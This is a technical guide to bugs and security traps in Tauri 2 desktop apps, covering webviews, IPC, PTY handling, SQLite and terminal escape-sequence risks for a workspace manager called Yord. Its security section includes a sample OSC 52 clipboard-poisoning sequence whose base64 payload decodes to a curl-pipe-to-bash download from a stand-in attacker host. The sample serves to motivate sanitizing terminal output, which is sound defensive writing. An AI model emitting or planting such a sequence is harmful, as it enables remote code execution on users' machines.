# Bugs, pitfalls, and security traps in Tauri 2 desktop apps

**Tauri 2's multi-webview support is unstable and broken on Linux, its IPC serializes everything as JSON with measurable overhead, and PTY process management requires platform-specific handling that most tutorials ignore.** These are not theoretical concerns — they come from real GitHub issues, CVEs, and production post-mortems across the Tauri, Electron, and Rust ecosystems. For a workspace manager like Yord that combines all three risk surfaces (multi-webview, PTY processes, persistent state), the compounding effect demands careful architecture from the start.

This document synthesizes findings from Tauri's issue tracker, Electron post-mortems, WezTerm/Alacritty source code, SQLite performance research, and published CVEs into specific, actionable guidance with code examples.

---

## Multi-webview is Tauri 2's most fragile feature

Multi-webview support in Tauri 2 requires the `unstable` feature flag — and the label is accurate. **On Linux, webview positioning is fundamentally broken**: child webviews stack vertically regardless of coordinates because WebKitGTK lacks support for positioned child webviews (issues #13071, #10420). On macOS, only the last-added child webview renders; earlier ones are invisible (#11376). On Windows, webviews loading external URLs frequently render as blank white rectangles (#10011, #14588).

Resize behavior compounds the problem. After repeated window resizes, webviews stop tracking the window edge and freeze at a fixed width. After maximize-restore cycles, positions don't return to their initial locations (#10131, #11170). The `auto_resize()` API is unreliable — the working pattern uses `ResizeObserver` on the JavaScript side to manually call `setPosition`/`setSize`.

IPC itself breaks in multi-webview setups. Issue #10131 reports `window.__TAURI_INTERNALS__.postMessage is not a function` errors in additional webviews. The event system has a critical gotcha: `listen()` catches ALL events of a given name regardless of target webview. Using `emitTo(label, event, payload)` does NOT restrict which listeners fire. You must use `getCurrentWebview().listen()` for webview-scoped listening.

```javascript
// ❌ BAD: Global listener receives events meant for other webviews
import { listen } from '@tauri-apps/api/event';
listen('terminal-output', handler);

// ✅ GOOD: Webview-scoped listener only receives targeted events
import { getCurrentWebview } from '@tauri-apps/api/webview';
getCurrentWebview().listen('terminal-output', handler);
```

Each webview instance carries significant memory overhead. A minimal Tauri app uses **~120MB on Windows** (dominated by WebView2, not Rust). On macOS with WKWebView, the Hopp benchmark measured **~29MB per window** versus ~68MB per Electron window. WebView2 on Windows creates approximately six processes even for a single webview (main, GPU, network, renderer, etc.). For Yord's tab system, the practical strategy is lazy creation — only instantiate the active tab's webview, and use `TrySuspendAsync()` on inactive WebView2 instances to release cached resources.

---

## IPC serialization is the hidden bottleneck most Tauri developers miss

Tauri's IPC carries a fundamental constraint: **all parameters and return values serialize as JSON** (a restriction from underlying webview libraries). One user reported transferring a 23MB file via `invoke()` took **8 seconds** on Windows due to serialization overhead (#9322). The v2 binary IPC path can handle 150MB in ~60ms through `fetch`-based custom protocols, but only when using `Vec<u8>` return types that map to `ArrayBuffer` on the JavaScript side.

Commands returning complex structs (`HashMap`, nested types) can cause the JavaScript Promise to hang indefinitely on certain platforms — this is a known high-priority bug (#10327) where Tauri falls back to the old IPC method with serialization bugs. Rapid command invocations (e.g., on every keystroke) each spawn a new thread in the async pool, causing **100% CPU**. The fix is frontend debouncing combined with cancellation tokens in managed state (#5894).

Tauri offers three IPC mechanisms with distinct performance profiles:

| Mechanism | Use case | Throughput | Ordering |
|-----------|----------|-----------|----------|
| **Commands** (`invoke`) | Request-response, CRUD | Good for small payloads | N/A |
| **Events** (`emit`/`listen`) | Lifecycle notifications | Poor — always JSON, evaluated as JS | Unordered |
| **Channels** (`tauri::ipc::Channel`) | Streaming data (PTY output, progress) | Best — ordered, avoids event overhead | Ordered |

**Channels are the correct choice for PTY output streaming.** Events are explicitly not designed for high-throughput scenarios. However, Channels have a known memory leak (#13133): Tauri keeps references to `onmessage` closures on the `window` object indefinitely. Delete `channel.onmessage` explicitly when components unmount.

```rust
// ❌ BAD: Sending large dataset through a single command
#[tauri::command]
fn get_all_sessions() -> Vec<Session> {
    db.query_all() // 10,000 sessions → massive JSON payload
}

// ✅ GOOD: Stream via Channel with pagination
#[tauri::command]
fn stream_sessions(channel: tauri::ipc::Channel<Vec<Session>>) {
    for chunk in db.query_paginated(100) {
        channel.send(chunk).unwrap();
    }
}
```

---

## PTY process management requires platform-aware architecture

PTY handling is where Rust desktop development differs most from web development, and where the most dangerous bugs hide. The `portable-pty` crate (part of WezTerm) is the standard choice, but it has critical platform-divergent behavior.

**Blocking reads are the primary architectural concern.** PTY reads are blocking system calls that will freeze the Tokio runtime if called directly in async code. The correct pattern is one dedicated `spawn_blocking` thread per PTY:

```rust
// ❌ BAD: Blocks tokio worker thread — freezes all async tasks
#[tauri::command]
async fn read_terminal(reader: /* ... */) -> Vec<u8> {
    let mut buf = [0u8; 4096];
    reader.read(&mut buf).unwrap(); // BLOCKS the runtime
    buf.to_vec()
}

// ✅ GOOD: Dedicated blocking thread + Channel streaming
fn spawn_pty_reader(
    reader: Box<dyn Read + Send>,
    channel: tauri::ipc::Channel<Vec<u8>>,
) {
    tokio::task::spawn_blocking(move || {
        let mut buf = [0u8; 4096];
        loop {
            match reader.read(&mut buf) {
                Ok(0) => break,
                Ok(n) => { channel.send(buf[..n].to_vec()).ok(); }
                Err(_) => break,
            }
        }
    });
}
```

**EOF detection diverges across platforms.** On Unix, dropping the slave side signals EOF to readers. On Windows, this doesn't work — the master PTY handle serves both read and write, so dropping the write side doesn't close the underlying handle. You must send EOT (`\x04`) explicitly. Additionally, on macOS you can only resize a PTY that already has a child spawned; Linux allows pre-spawn resize. The slave must be dropped after spawning on Unix, but dropping it on Windows breaks writes.

Rust's `Child::kill()` sends **SIGKILL, not SIGTERM** — meaning neovim can't save swap files, and yazi can't clean up. Worse, `kill()` only terminates the direct child, not its descendants (shell → neovim → LSP server). The correct approach uses process groups and graceful shutdown:

```rust
use std::os::unix::process::CommandExt;

// Create child in its own process group
let mut cmd = Command::new("bash");
cmd.process_group(0); // Child becomes process group leader

let child = cmd.spawn()?;

// Graceful shutdown: SIGTERM → wait → SIGKILL
fn graceful_kill(pid: u32, timeout: Duration) -> Result<()> {
    let pgid = -(pid as i32); // Negative PID = process group
    unsafe { libc::kill(pgid, libc::SIGTERM); }
    
    let deadline = Instant::now() + timeout;
    loop {
        if child.try_wait()?.is_some() { return Ok(()); }
        if Instant::now() > deadline { break; }
        std::thread::sleep(Duration::from_millis(100));
    }
    unsafe { libc::kill(pgid, libc::SIGKILL); }
    child.wait()?;
    Ok(())
}
```

**Child processes survive Tauri app exit by default.** This is the single most dangerous process management bug for Yord. The Auto-Claude project documented an accumulation pattern where each app restart left orphaned processes, eventually consuming 4x the expected resources. Tauri's `MenuItem::Quit` calls `exit(0)` immediately, skipping `RunEvent::ExitRequested` and all cleanup handlers (#7586). `AppHandle::exit()` similarly calls `std::process::exit()` which skips all destructors. You need a custom quit handler, cleanup in `RunEvent::ExitRequested`, and a startup sweep for orphaned processes from previous crashes.

For high-throughput terminal output (e.g., `cat large_file`), WezTerm's architecture is the gold standard: one thread reads from the PTY in a blocking loop, writes to a socketpair with configured buffer sizes, and a second thread reads from the socketpair using `poll()` to **coalesce output into frames** (~8–16ms batches). On the JavaScript side, xterm.js processes **5–35 MB/s** with a hardcoded 50MB write buffer. Use the WebGL renderer addon for GPU-accelerated rendering, and implement flow control callbacks to prevent overwhelming the emulator.

---

## State management deadlocks stem from three specific anti-patterns

The most common Tauri state management bug is using `std::sync::Mutex` in a non-async command. **Non-async commands run on the main thread.** If a sync command calls `window.hide()` (which blocks waiting for the main thread) while holding a mutex, the UI freezes permanently (#3561):

```rust
// ❌ DEADLOCK: Sync command blocks main thread
#[tauri::command]
fn hide_overlay(window: tauri::Window, state: State<'_, Mutex<AppState>>) {
    let _guard = state.lock().unwrap();
    window.hide().unwrap(); // Blocks waiting for main thread — which we're on
}

// ✅ SAFE: Async command runs on tokio thread pool
#[tauri::command(async)]
async fn hide_overlay(window: tauri::Window, state: State<'_, Mutex<AppState>>) -> Result<(), ()> {
    let _guard = state.lock().unwrap();
    window.hide().unwrap();
    Ok(())
}
```

Turso discovered you can deadlock Tokio with just **one** `std::sync::Mutex` shared between an async task and a `spawn_blocking` task. When the blocking task holds the lock and calls `block_on()`, it needs a Tokio worker thread — but all workers may be blocked waiting for the same lock. The Tokio docs recommend `std::sync::Mutex` for performance, but this is a razor blade optimization. Default to `tokio::sync::Mutex` in async code unless profiling proves otherwise.

For complex state like PTY process registries, the actor pattern eliminates lock contention entirely:

```rust
// ❌ FRAGILE: Shared mutable state with locks
type PtyRegistry = Arc<Mutex<HashMap<String, PtyProcess>>>;

// ✅ ROBUST: Actor owns state, communicates via channels
enum PtyCommand {
    Spawn { id: String, cmd: String, reply: oneshot::Sender<Result<()>> },
    Write { id: String, data: Vec<u8> },
    Resize { id: String, rows: u16, cols: u16 },
    Kill { id: String },
}

async fn pty_manager(mut rx: mpsc::Receiver<PtyCommand>) {
    let mut processes: HashMap<String, PtyProcess> = HashMap::new();
    while let Some(cmd) = rx.recv().await {
        match cmd { /* handle commands — no locks needed */ }
    }
}
```

Two additional traps: using `State<'_, AppState>` when you registered `Mutex<AppState>` causes a **runtime panic** (no compile-time error) — use type aliases to prevent this. And calling `manage()` twice with the same type silently ignores the second registration.

---

## SQLite performance hinges on a single-writer architecture

The most impactful SQLite finding comes from Evan Schwartz's 2026 benchmarks: **a single-writer connection pattern is ~20x faster than a shared connection pool.** With 50 pooled connections, writes achieved 2,586 rows/sec with P99 latency of 182 seconds. With a single dedicated writer, the same workload achieved **60,061 rows/sec with P99 of 82ms.**

SQLite is fundamentally single-writer. In WAL mode, concurrent readers and one writer work well, but a connection pool where any connection can write creates EXCLUSIVE lock contention. With async Rust (sqlx), calling `.await` inside a write transaction yields control while holding the lock — other tasks then timeout.

```rust
// Recommended architecture for Yord
struct Database {
    writer: Mutex<Connection>,     // Single writer, serializes writes
    reader_pool: Vec<Connection>,  // Multiple read-only connections
}

// Essential PRAGMAs — run on every new connection
fn configure_connection(conn: &Connection) -> Result<()> {
    conn.execute_batch("
        PRAGMA journal_mode = WAL;
        PRAGMA synchronous = NORMAL;
        PRAGMA busy_timeout = 5000;
        PRAGMA foreign_keys = ON;
        PRAGMA temp_store = MEMORY;
        PRAGMA mmap_size = 268435456;
        PRAGMA cache_size = -16000;
    ")?;
    Ok(())
}
```

For a desktop app, **rusqlite is the right choice over sqlx**. The async nature of sqlx adds complexity without benefit — wrap rusqlite calls in `spawn_blocking` when needed. Note that you cannot easily use both rusqlite and sqlx-sqlite in the same workspace since they both link `libsqlite3-sys`.

A critical SQLite bug affects all versions from 3.7.0 through 3.51.2: a **WAL-reset data race** when two connections write or checkpoint simultaneously. This was fixed in SQLite **3.51.3** (March 2026) — verify your bundled version. Also watch for WAL sidecar files (`.wal`, `.shm`): deleting the `.db` file while leaving the `.wal` file, then creating a new database with the same name, causes SQLite to replay stale WAL against the fresh database — **guaranteed corruption**.

---

## Terminal escape sequences are the highest-severity security risk

For a PTY-managing app, **ANSI escape sequence injection is the most dangerous attack surface.** This is not theoretical: CVE-2022-45872 (CVSS 9.8 Critical) demonstrated RCE in iTerm2 via DECRQSS responses. CVE-2024-38395/38396 achieved RCE through iTerm2's title reporting combined with tmux integration. These attacks work by having a malicious process print crafted escape sequences that the terminal emulator interprets as commands.

The specific sequences dangerous for Yord:

**OSC 52 clipboard poisoning** silently writes attacker-controlled content to the system clipboard. If the user pastes anywhere, the injected command executes. A cloned git repo containing a file with these bytes in its content could trigger this when `cat`-ed:
```
\x1b]52;c;Y3VybCBodHRwczovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaAo=\x07
// Base64 decodes to: curl https://evil.com/shell.sh | bash
```

**Cursor manipulation** (`\e[1A` cursor up, `\e[2K` erase line) rewrites what the user sees, hiding malicious commands behind innocent-looking output. **OSC 8 hyperlink injection** presents clickable links in terminal output, including `file://` URIs. **Character injection multiplication** via ANSI multiplier codes can print billions of characters, causing DoS.

The mitigation is a **whitelist of allowed escape sequences**, not a blacklist. Strip OSC 52, DECRQSS responses, title set/report sequences, and OSC 5113 (Kitty file transfer) before rendering in xterm.js.

Tauri has **seven published security advisories** including: iframe IPC bypass where remote iFrames could invoke Tauri API endpoints without permission (GHSA-57fm-592m-34r7); filesystem scope bypass via glob patterns that matched dotfiles like `.ssh` (GHSA-6mv3-wm7j-h4w5); symlink traversal in `readDir` (GHSA-28m8-9j7v-x499); and open redirect escalation where redirecting a Tauri window to an external site granted that site full IPC access (GHSA-4wm2-cwcf-wwvp).

**CSP is not enabled by default in Tauri.** If `security.csp` is omitted from `tauri.conf.json`, there is zero CSP protection, leaving the app wide open to XSS that escalates to full IPC access. On Linux and Android, Tauri **cannot distinguish between requests from an embedded iframe and the parent window** — remote URL capabilities apply to both. All capability files in `src-tauri/capabilities/` are automatically enabled, meaning test files accidentally left in production grant those permissions.

---

## Svelte 5 reactivity creates a hidden 5,000x performance cliff

Svelte 5's `$state()` creates deep Proxy objects for all nested properties. For large data structures from the Rust backend — file trees, session state, terminal buffers — this proxy overhead is catastrophic. The @keenmate/svelte-treeview library measured a **5,000x slowdown** when using `$state()` instead of `$state.raw()` for tree data:

```svelte
<script>
  // ❌ SLOW: Deep proxy wraps every node in the file tree
  let fileTree = $state(await invoke('get_file_tree'));

  // ✅ FAST: No proxy — must reassign to trigger updates
  let fileTree = $state.raw(await invoke('get_file_tree'));
  
  async function refresh() {
    fileTree = await invoke('get_file_tree'); // Reassignment triggers update
  }
</script>
```

For Yord's project tree, combine `$state.raw()` with virtual scrolling. The @keenmate/svelte-treeview loads **17,000+ nodes in under 100ms** using flat rendering mode (12x faster than recursive Svelte components). For the terminal list and other scrollable areas, svelte-tiny-virtual-list handles millions of entries at ~5KB gzipped.

---

## Session restoration should use progressive four-phase loading

VS Code's session restoration evolved over years and remains imperfect. Key bugs to learn from: terminal history from VS Code bleeds into VS Code Insiders when running simultaneously (#136013); sessions become completely lost after shutdown, opening the wrong project (#36964); stale SQLite state files cause thread history loss after restart (Codex #14812).

The recommended strategy for Yord:

**Phase 1 (0–200ms):** Restore window layout from SQLite — dimensions, split positions, pane configuration. Show skeleton/placeholder UI. Set windows to `visible: false` initially, let `tauri-plugin-window-state` restore geometry, then show.

**Phase 2 (200ms–1s):** Restore the active/focused terminal and webview only. Load the file tree from cached SQLite state (not a filesystem scan). Other tabs show loading indicators.

**Phase 3 (1–5s):** Spawn PTY processes for inactive terminals. Initialize additional webviews lazily as tabs are selected. Re-scan the filesystem and diff against cached state.

**Phase 4 (5s+):** Run `PRAGMA optimize` on SQLite. Pre-warm caches. Connect to external services.

Serialize session state atomically — never write partial state. Version the session format for forward/backward compatibility. Handle stale state gracefully: if a restored PTY path no longer exists, show the last-known buffer with a clear "historical" indicator rather than crashing.

---

## Memory leaks accumulate from three sources in long-running Tauri apps

Emitting events from Rust at high frequency causes unbounded webview memory growth. After **2 million events, the frontend reached ~1.1GB** (#852, #12724). Each event creates JavaScript closures and strings that accumulate. Channel `onmessage` closures leak indefinitely (#13133). File watchers, PTY readers, and other resources persist after webview reload, causing both memory leaks and broken event handlers (#10266).

The fix is disciplined cleanup in every component:

```javascript
// Every Tauri listener needs explicit cleanup
let unlisteners = [];

onMount(async () => {
  unlisteners.push(await getCurrentWebview().listen('event', handler));
});

onDestroy(() => {
  unlisteners.forEach(fn => fn());
  if (channel) delete channel.onmessage; // Fix Channel leak
});

// Also handle page reload
window.addEventListener('unload', () => {
  unlisteners.forEach(fn => fn());
});
```

On the Rust side, monitor both JavaScript heap AND RSS. Heap snapshots don't show native WebView2 memory. WebView2 is known for memory growth over time — periodically setting `MemoryUsageTargetLevel.Low` on inactive views helps, but some baseline growth is unavoidable.

---

## Conclusion

The three architectural decisions that will most determine Yord's reliability are: **using Channels (not events) for PTY streaming** to avoid the event accumulation memory leak and get ordered delivery; **adopting the actor pattern for PTY process management** to eliminate lock contention and ensure clean shutdown via process groups; and **implementing single-writer SQLite with WAL mode** using the specific PRAGMAs listed above.

The multi-webview instability on Linux is the biggest risk to cross-platform shipping — consider a single-webview architecture with tab content swapping as a fallback. Terminal escape sequence sanitization is not optional for a PTY-managing app; real CVEs with CVSS 9.8 demonstrate RCE through unsanitized terminal output. And Svelte 5's `$state.raw()` is mandatory for any data structure larger than a few hundred items — the proxy overhead creates a performance cliff that no amount of backend optimization can compensate for.
